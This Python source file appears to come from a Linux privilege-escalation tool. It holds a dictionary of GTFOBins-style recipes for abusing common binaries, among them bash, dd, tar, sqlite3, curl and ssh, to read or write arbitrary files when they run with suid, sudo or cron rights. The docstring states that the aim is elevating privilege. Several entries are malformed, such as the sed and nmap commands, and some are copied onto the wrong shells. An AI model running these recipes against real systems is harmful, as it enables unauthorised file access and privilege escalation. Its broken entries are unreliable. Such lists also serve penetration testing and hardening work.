#!/usr/bin/env python
# -*- coding: utf-8 -*-


class Binaries:
    """
    Binaries that allow to execute commands from it.
    If run with higher privilege (suid / cron / ...) could be used to elevate our privilege
    http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html
    https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html#abusing-sudo-rights
    http://touhidshaikh.com/blog/?p=790
    """

    def __init__(self):
        """
        List taken from GTFOBins:
        https://gtfobins.github.io/#
        """

        self.binaries = {
            "apt": {},
            "apt-get": {},
            "aria2c": {},
            "ash": "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n",
            "awk": "LFILE=file_to_write\nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n",
            "base64": "LFILE=file_to_read\nbase64 \"$LFILE\" | base64 --decode\n",
            "bash": "export LFILE=file_to_write\nbash -c 'echo DATA > $LFILE'\n",
            "busybox": "LFILE=file_to_write\nbusybox sh -c 'echo \"DATA\" > $LFILE'\n",
            "cat": "LFILE=file_to_read\ncat \"$LFILE\"\n",
            "chmod": {},
            "chown": {},
            "cp": {},
            "cpan": {},
            "cpulimit": {},
            "crontab": {},
            "csh": "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n",
            "curl": "LFILE=/tmp/file_to_read\ncurl file://$LFILE\n",
            "cut": "LFILE=file_to_read\ncut -d \"\" -f1 \"$LFILE\"\n",
            "dash": "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n",
            "date": "LFILE=file_to_read\ndate -f $LFILE\n",
            "dd": "LFILE=file_to_write\necho \"DATA\" | dd of=$LFILE\n",
            "diff": "LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE\n",
            "dmsetup": {},
            "docker": {},
            "easy_install": "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"import os;\nos.execl('$(whereis python)', 'python', '-c', 'open(\\\"$LFILE\\\",\\\"w+\\\").write(\\\"DATA\\\")')\" > $TF/setup.py\neasy_install $TF\n",
            "ed": "ed file_to_write\na\nDATA\n.\nw\nq\n",
            "emacs": "emacs file_to_write\nDATA\nC-x C-s\n",
            "env": {},
            "expand": "LFILE=file_to_read\nexpand \"$LFILE\"\n",
            "expect": {},
            "facter": {},
            "find": {},
            "finger": {},
            "flock": {},
            "fmt": "LFILE=file_to_read\nfmt -pNON_EXISTING_PREFIX \"$LFILE\"\n",
            "fold": "LFILE=file_to_read\nfold -w99999999 \"$LFILE\"\n",
            "ftp": {},
            "gdb": "LFILE=file_to_write\ngdb -nx -ex \"dump value $LFILE \\\"DATA\\\"\" -ex quit\n",
            "git": {},
            "grep": "LFILE=file_to_read\ngrep '' $LFILE\n",
            "head": "LFILE=file_to_read\nhead -c1G \"$LFILE\"\n",
            "ionice": {},
            "jjs": "echo 'var FileWriter = Java.type(\"java.io.FileWriter\");\nvar fw=new FileWriter(\"./file_to_write\");\nfw.write(\"DATA\");\nfw.close();' | jjs\n",
            "journalctl": {},
            "jq": "LFILE=file_to_read\njq -Rr . \"$LFILE\"\n",
            "jrunscript": "jrunscript -e 'var fw=new java.io.FileWriter(\"./file_to_write\"); fw.write(\"DATA\"); fw.close();'",
            "ksh": "export LFILE=file_to_write\nksh -c 'echo DATA > $LFILE'\n",
            "ld.so": {},
            "less": "echo DATA | less\nsfile_to_write\nq\n",
            "ltrace": {},
            "lua": "lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"DATA\"); io.close(f);'",
            "mail": {},
            "make": "LFILE=file_to_write\nmake -s --eval=\"\\$(file >$LFILE,DATA)\" .\n",
            "man": "man file_to_read",
            "more": "more file_to_read",
            "mount": {},
            "mv": {},
            "mysql": {},
            "nano": "nano file_to_write\nDATA\n^O\n",
            "nc": {},
            "nice": {},
            "nl": "LFILE=file_to_read\nnl -bn -w1 -s '' $LFILE\n",
            "nmap": "TF=$(mktemp)\necho 'lua -e 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF\nnmap --script=$TF\n",
            "node": {},
            "od": "LFILE=file_to_read\nod -An -c -w9999 \"$LFILE\"\n",
            "perl": {},
            "pg": "pg file_to_read",
            "php": {},
            "pic": {},
            "pico": "pico file_to_write\nDATA\n^O\n",
            "pip": "export LFILE=/tmp/file_to_save\nTF=$(mktemp -d)\necho \"open('$LFILE','w+').write('DATA')\" > $TF/setup.py\npip install $TF\n",
            "puppet": "export LFILE=\"/tmp/file_to_write\"\npuppet apply -e \"file { '$LFILE': content => 'DATA' }\"\n",
            "python": "python -c 'open(\"file_to_write\",\"w+\").write(\"DATA\")'",
            "red": "red file_to_write\na\nDATA\n.\nw\nq\n",
            "rlwrap": "LFILE=file_to_write\nrlwrap -l \"$LFILE\" echo DATA\n",
            "rpm": {},
            "rpmquery": {},
            "rsync": {},
            "ruby": "ruby -e 'File.open(\"file_to_write\", \"w+\") { |f| f.write(\"DATA\") }'",
            "scp": {},
            "sed": "LFILE=file_to_write\nsed -n '1e exec sh 1>&0 /etc/hosts\n",
            "setarch": {},
            "sftp": {},
            "shuf": "LFILE=file_to_write\nshuf -e DATA -o \"$LFILE\"\n",
            "smbclient": {},
            "socat": {},
            "sort": "LFILE=file_to_read\nsort -m \"$LFILE\"\n",
            "sqlite3": "LFILE=file_to_write\nsqlite3 /dev/null -cmd \".output $LFILE\" 'select \"DATA\";'\n",
            "ssh": "LFILE=file_to_read\nssh -F $LFILE localhost\n",
            "start-stop-daemon": {},
            "stdbuf": {},
            "strace": {},
            "tail": "LFILE=file_to_read\ntail -c1G \"$LFILE\"\n",
            "tar": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > \"$TF\"\ntar c --xform \"s@.*@$LFILE@\" -OP \"$TF\" | tar x -P\n",
            "taskset": {},
            "tclsh": {},
            "tcpdump": {},
            "tee": "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n",
            "telnet": {},
            "tftp": {},
            "time": {},
            "timeout": {},
            "ul": "LFILE=file_to_read\nul \"$LFILE\"\n",
            "unexpand": "LFILE=file_to_read\nunexpand -t99999999 \"$LFILE\"\n",
            "uniq": "LFILE=file_to_read\nuniq \"$LFILE\"\n",
            "unshare": {},
            "vi": "vi file_to_write\niDATA\n^[\nw\n",
            "vim": "vim file_to_write\niDATA\n^[\nw\n",
            "watch": {},
            "wget": {},
            "whois": {},
            "wish": {},
            "xargs": "LFILE=file_to_read\nxargs -a \"$LFILE\" -0\n",
            "xxd": "LFILE=file_to_write\necho DATA | xxd | xxd -r - \"$LFILE\"\n",
            "zip": {},
            "zsh": {}
        }

    def find_binary(self, binary):
        """
        Found the associated command line to execute system code using the binary
        """
        for b in self.binaries:
            if b == binary.lower():
                return self.binaries[b]
        return False
